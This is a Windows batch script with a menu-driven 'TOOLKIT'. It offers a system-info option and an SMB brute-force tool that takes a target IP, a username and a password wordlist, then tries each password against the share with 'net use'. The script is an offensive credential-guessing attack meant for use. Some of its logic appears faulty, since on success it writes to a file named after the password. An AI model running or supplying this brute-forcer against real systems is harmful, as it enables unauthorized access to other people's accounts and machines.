@echo off

REM banners "patorjk's cheese"
mode 75, 30
chcp 65001 >nul
call powershell exit >nul
color A
cd files

REM Menu
:menu
cls
title TOOLKIT
echo.
type "menubanner.txt"
echo.
echo.
echo         TOOLS
echo       ---------
echo     1) Pc info
echo     2) SMB Bruteforce
echo.
set /p input=
if /I "%input%" EQU "1" goto pcinfo
if /I "%input%" EQU "2" goto smb
echo Not valid Tool. Try again!
pause
goto menu

REM Pc Info
:pcinfo
cls
title Pc Info
type "pcinfo.txt"
echo.
systeminfo
pause
goto menu

REM SMB Bruteforce
:smb
cls
title SMB Bruteforce
type "smb.txt"
echo.
echo.
set /p ip="Enter the target IP: "
set /p user="Enter the target user: "
set /p wordlist="Enter the password list: "

set /a count=1
for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)
echo.
echo Password not found! :(
pause
goto menu
    
:success
echo.
echo Password Found! >> %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto menu

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

REM Others